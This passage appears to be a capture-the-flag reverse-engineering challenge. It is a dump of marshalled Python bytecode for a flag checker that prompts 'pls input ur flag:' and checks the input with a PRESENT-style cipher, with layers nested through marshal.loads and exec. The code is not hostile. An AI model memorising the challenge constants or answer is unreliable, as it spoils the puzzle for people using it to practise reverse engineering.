x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\tr\x11\x00\x00\x00\xda\x05rangeZ\x08Sbox_invrH\x00\x00\x00Z\x08PBox_inv\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x10\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00\xda\x08&lt;module&gt;\x03\x00\x00\x00sl\x00\x00\x00$\x01\x12\x01 \x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x01\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\x00\x02\xfd\x04\x04\x12\x02\n\x01&#39;
code[1] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 \x01\x16\x01r\x0e\x00\x00\x00sF\x03\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00@\x00\x00\x00s\xa6\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01d\x02\x83\x01Z\x02e\x03e\x02\x83\x01d\x03k\x03r,e\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00e\x02d\x06d\x07\x85\x02\x19\x00e\x02d\x07d\x08\x85\x02\x19\x00e\x02d\x08d\t\x85\x02\x19\x00e\x02d\td\x03\x85\x02\x19\x00g\x04Z\x06d\nd\x0bd\x0cd\rg\x04Z\x07e\x00e\x06\x83\x01Z\x08e\td\x0e\x83\x01D\x00]$Z\ne\x07e\n\x19\x00e\x08e\n\x19\x00k\x03rte\x04d\x04\x83\x01\x01\x00e\x05d\x05\x83\x01\x01\x00qte\x04d\x0f\x83\x01\x01\x00d\x06S\x00)\x10c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00sp\x00\x00\x00d\x01&#125;\x01t\x00d\x02|\x01\x83\x02&#125;\x02g\x00&#125;\x03|\x00D\x00]T&#125;\x04t\x01|\x04\x83\x01&#125;\x05t\x02|\x01d\x03\x18\x00\x83\x01D\x00]&quot;&#125;\x06t\x03|\x05|\x02|\x06\x19\x00\x83\x02&#125;\x05t\x04|\x05\x83\x01&#125;\x05t\x05|\x05\x83\x01&#125;\x05q.t\x03|\x05|\x02d\x04\x19\x00\x83\x02&#125;\x07|\x03\xa0\x06|\x07\xa1\x01\x01\x00q\x16|\x03S\x00)\x05N\xe9 \x00\x00\x00l\x06\x00\x00\x00! 20\\X\xa8 1!\x02\x00\xe9\x01\x00\x00\x00\xe9\xff\xff\xff\xff)\x07Z\x13generateRoundkeys80Z\rstring2number\xda\x05rangeZ\x0baddRoundKeyZ\tsBoxLayerZ\x06pLayer\xda\x06append)\x08\xda\x06blocks\xda\x06roundsZ\troundkeysZ\x03outZ\x05block\xda\x05state\xda\x01iZ\x06cipher\xa9\x00r\t\x00\x00\x00\xda\x00\xda\x07encrypt\x02\x00\x00\x00s\x18\x00\x00\x00\x00\x01\x04\x01\n\x01\x04\x01\x08\x01\x08\x01\x10\x01\x0e\x01\x08\x01\n\x01\x0e\x01\x0c\x01r\x0b\x00\x00\x00z\x12pls input ur flag:r\x00\x00\x00\x00z\x0bwrong flag!\xe9\x00\x00\x00\x00N\xe9\x08\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x18\x00\x00\x00l\x04\x00\x00\x00\x9e\x1faH\xc4\x13d\rl\x05\x00\x00\x00b]t:\x94Z\x15\x18\x0e\x00l\x04\x00\x00\x000ek95\x04\xb2&quot;l\x05\x00\x00\x00\x88o\xeddY\x13\xb1L\x01\x00\xe9\x04\x00\x00\x00z\x08Correct!)\x0br\x0b\x00\x00\x00\xda\x05inputZ\x03inp\xda\x03len\xda\x05print\xda\x04exitr\x05\x00\x00\x00Z\x04cmpsZ\nout_blocksr\x03\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x18\x00\x00\x00\x08\x0e\x08\x01\x0c\x01\x08\x01\x08\x01,\x01\x0c\x01\x08\x01\x0c\x01\x10\x01\x08\x01\n\x01N)\x05r\x0e\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x0c\x00\x00\x00r\x0c\x00\x00\x00r\x0c\x00\x00\x00r\r\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\t\n\x01N)\x05r\x0b\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x06\x00\x00\x00r\x06\x00\x00\x00r\x06\x00\x00\x00r\x07\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01N)\x05r\t\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x07\x00\x00\x00r\x07\x00\x00\x00r\x07\x00\x00\x00r\x08\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\n\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x08\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x06\n\x01N)\x05r\x03\x00\x00\x00\xda\x07marshal\xda\x05loads\xda\x02co\xda\x04execr\x00\x00\x00\x00r\x00\x00\x00\x00r\x00\x00\x00\x00r\x02\x00\x00\x00\xda\x08&lt;module&gt;\x02\x00\x00\x00s\x04\x00\x00\x00\x08\x03\n\x01&#39;
code[2] = b&#39;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 